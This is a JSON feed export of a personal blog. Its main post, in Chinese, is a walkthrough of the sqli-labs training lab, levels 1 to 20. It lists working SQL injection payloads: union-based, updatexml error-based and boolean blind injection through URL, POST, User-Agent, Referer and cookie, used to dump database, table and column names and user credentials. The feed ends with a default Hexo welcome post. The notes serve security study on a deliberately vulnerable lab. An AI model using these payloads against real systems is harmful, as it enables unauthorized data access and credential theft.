{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/04/24/sqli-labs/",
            "url": "http://example.com/2023/04/24/sqli-labs/",
            "title": "",
            "date_published": "2023-04-23T16:32:55.178Z",
            "content_html": "<h3 id=\"怎么判断字符型或者数字型\"><a class=\"markdownIt-Anchor\" href=\"#怎么判断字符型或者数字型\">#</a> 怎么判断字符型或者数字型？</h3>\n<p>数字型:id=2 和 id=3-1 返回界面相同<br>\n原理：说明 2-1 被解析了，旁边没有引号<br>\n字符型:id=2 和 id=2a 页面一样就行<br>\n原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&gt; 数字</p>\n<p>group_concat 是用，连接多行记录的函数</p>\n<p>less1<br>\n 字符型注入<br>\n看源码:sql=“SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>\n<p>因此:<mark>payload:1’   操作   --+</mark></p>\n<p>?id=1’ order by 3–+<br>\n?id=1’ order by 4–+<br>\n?id=-1’ union select 1,2,3–+// 判断回显位<br>\n？id=-1’ union select 1,2,database ()–+<br>\n?id=-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>\n<p>?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ and table_schema=database()–+</p>\n<p>?id=-1’ union select 1,group_concat(username),group_concat(password) from users–+</p>\n<p>less2<br>\n 数字型<br>\n看源码:sql=“SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br>\n 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可</p>\n<p>布尔盲注:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&#x27;D&#x27;</span><br></pre></td></tr></table></figure>\n<p>less3<br>\nid=1’)–+</p>\n<p>less4<br>\nid=1&quot;)–+</p>\n<p>less5<br>\n 报错注入:updatexml 函数<br>\n updatexml (xml_doument,XPath_string,new_value)<br>\n 第一个参数：XML 的内容<br>\n第二个参数：是需要 update 的位置 XPATH 路径<br>\n第三个参数：是更新后的内容<br>\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式，不对就爆出正确内容<br>\n可以校验的：0x7e (~),0x5e24 (^$),’#’(#)<br>\npayload:<br>\n?id=1’ and updatexml (1,concat (0x7e,database ()),1)–+ 暴当前数据库</p>\n<p>?id=1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)–+<br>\n 此时会出现 Subquery returns more than 1 row<br>\n1. 可以用 limit 解决，limit 0,1 1,1 2,1 3,1<br>\n 在 limit 3,1 找到 users 表<br>\n？id=1’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=database () limit 3,1)),1)–+<br>\n 后面同理爆字段<br>\n 2. 加个 group_concat 解决<br>\n？id=1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1)–+<br>\n 过程同上<br>\n最后<br>\n？id=1’ and updatexml (1,concat (0x7e,(select group_concat (username) from users)),1)–+</p>\n<p>substr 方法<br>\n’ or updatexml (1,concat (0x7e,substr ((select group_concat (schema_name) from information_schema.schemata),1,31),0x7e),1)–+<br>\n 后面把 1,31 换成 32,31<br>\n63,31<br>\n94,31</p>\n<p>less6<br>\nid=1&quot; 与 less5 一样</p>\n<p>less7<br>\n 布尔盲注<br>\n根据页面回显试探数据，可以二分法，函数:substring (),mid (),substr ().<br>\neg.?id=1’ and (select mid((select concat(user,0x7e,password) from users),1,1))=’’–+<br>\n 一直到 less10, 布尔和时间盲注直接用 sqlimap</p>\n<p>less11<br>\n 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式<br>\n uname=11&amp;passwd=1&amp;submit=Submit<br>\n 判断字符型<br>\n接下来用基本的 union 注入就欧克<br>\n less12<br>\n&quot;) 型，联合注入<br>\n less13<br>\n)’ # 加上报错注入<br>\n less14<br>\n“# 加上报错注入<br>\n less15<br>\n 不显示报错信息只能盲注<br>\n单引号字符型的布尔盲注:<br>\n1’ --+<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=\"> 用脚本 less15.py</span><br>\n 用法:<br>\nfrom less15 import *<br>\nDatabase15()<br>\nTables15()<br>\n Columns15 (‘库’,‘表’)<br>\n Content15 (‘库’,‘表’,‘字段’,‘字段’)<br>\nless16<br>\n 双引号字符型加括号的盲注<br>\n 1”) --+<br>\n 脚本:less16.py</p>\n<p>less17<br>\n1. 注入点在 password 栏里，单引号字符加报错注入<br>\n 2. 先抓包，copy to file, 用 sqlmap 工具<br>\n python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 路径</p>\n<p>less18<br>\n 注入点在 user-agent, 且用户名密码必须正确<br>\n注意：闭合之前的部分必须为空，很恶心<br>\n’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’</p>\n<p>最后:<br>\n’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p>\n<p>less19<br>\n 与 18 一样，注入点在 referer</p>\n<p>less20<br>\n 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/23/hello-world/",
            "url": "http://example.com/2023/04/23/hello-world/",
            "title": "Hello World",
            "date_published": "2023-04-23T15:55:29.640Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}